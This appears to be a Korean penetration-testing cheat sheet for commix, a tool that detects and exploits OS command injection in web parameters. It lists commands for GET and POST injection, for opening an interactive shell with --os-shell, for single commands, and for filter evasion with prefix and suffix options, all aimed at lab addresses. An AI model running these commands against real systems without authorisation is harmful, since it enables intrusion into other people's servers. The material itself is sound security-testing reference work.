# commix 명령 삽입 자동화

- commix — OS command injection 취약점을 자동으로 탐지하고 악용하는 Python 도구. GET/POST 파라미터에 삽입 기법을 순회해 성공한 기법으로 대화형 셸을 만든다.
- 파라미터가 ping, nslookup 같은 시스템 명령 결과를 반영해 명령 삽입을 의심할 때, 수동 삽입 문법(;, |, &&)을 하나씩 시도하기 번거로울 때, 탐지 후 대화형 셸이 필요할 때.
- Python 실행 환경 필요. Kali는 apt install commix, Windows는 소스 실행(python commix.py).

## 기본 명령어 구조

```bash
# Kali 설치
sudo apt install commix

commix -u "http://HOST:PORT/page.php?cmd=ping" [옵션]

# Windows 소스 실행
python workspace\web\src-commixproject-commix-master\commix-master\commix.py -u "http://10.10.10.10/exec.php?cmd=ping"
```

## GET 파라미터 자동 탐지

```bash
commix -u "http://10.10.10.10/exec.php?host=127.0.0.1"
```

- commix가 host 파라미터에 classic(;, |), eval, time-based, file-based 기법을 순회하며 성공 여부를 판정하고, 통한 기법으로 이후 명령을 전송한다.

## POST 데이터 삽입

```bash
commix -u "http://10.10.10.10/ping.php" --data "ip=127.0.0.1"
# 삽입 지점을 특정 파라미터로 한정
commix -u "http://10.10.10.10/ping.php" --data "ip=127.0.0.1" -p ip
```

## 대화형 셸과 단발 명령

```bash
# 성공 판정 후 대화형 OS 셸 진입
commix -u "http://10.10.10.10/exec.php?cmd=ping" --os-shell

# 셸 프롬프트 없이 명령 하나만 실행
commix -u "http://10.10.10.10/exec.php?cmd=ping" --os-cmd "whoami"

# 백엔드 OS 강제 지정
commix -u "http://10.10.10.10/exec.php?cmd=ping" --os=Unix-like
```

- --os-shell이 대화형 셸 옵션이고, --os는 OS 강제 지정용이다. 역할이 다르므로 혼동 주의.

## 주요 옵션

- `-u, --url`: 대상 URL. GET 파라미터가 여러 개면 -p로 테스트 대상을 좁힌다.
- `-d, --data`: POST 본문. 지정하면 본문 파라미터들이 삽입 후보가 된다.
- `-p`: 테스트할 파라미터 지정(콤마로 다중).
- `--os-shell`: 명령 삽입 성공 시 대화형 셸 프롬프트 진입.
- `--os-cmd`: 대화형 없이 명령 한 번만 실행.
- `--os`: 백엔드 OS 강제(Windows / Unix-like).
- `--prefix, --suffix`: 명령 앞뒤 고정 문자열. 예: --suffix="%26".
- `--cookie, -H`: 세션 쿠키·추가 헤더 유지.
- `--batch`: 대화형 질문에 기본값으로 자동 응답.
- `--technique`: 사용 기법 제한. 문자 r, b, t, f(random, boolean, time, file based), 기본값 rbtf.

## 자동 탐지 원리

```text
1. 삽입 지점에 기준 명령(ping 8.8.8.8)과 변형(echo 마커, sleep 지연)을 넣는다
2. 응답 본문 차이, 지연 시간 차이로 성공 기법을 판정한다
3. 명령 구분자(;, |, &&, \n)와 인코딩 변형을 조합해 필터 우회를 시도한다
4. 판정된 기법으로 이후 모든 명령을 일괄 전송한다
```

## 실전 예시

```bash
# 인증 쿠키 + POST 본문 + 대화형 셸까지
commix -u "http://10.10.10.10/diag.php" --data "host=127.0.0.1" --cookie "PHPSESSID=abc123" --os-shell

# 자동 응답 + 파라미터 한정으로 빠르게
commix -u "http://10.10.10.10/exec.php?host=x&user=x" -p host --batch
```

## 팁·트러블슈팅

- 실전 속도 핵심은 -p 파라미터 한정 + --batch 조합이다. 전체 파라미터 자동 탐색은 오래 걸린다.
- 탐지는 됐는데 출력이 안 보이면(time-based 등) --os-cmd로 단발 검증부터 다시 한다.
- 응답이 느린 대상은 --timeout과 --retries를 조정하고, 닫는 문자열이 있는 문법은 --prefix·--suffix로 우회한다.
- Windows에서 python commix.py 실행 중 인코딩 에러가 나면 PYTHONIOENCODING=utf-8을 앞에 붙인다.
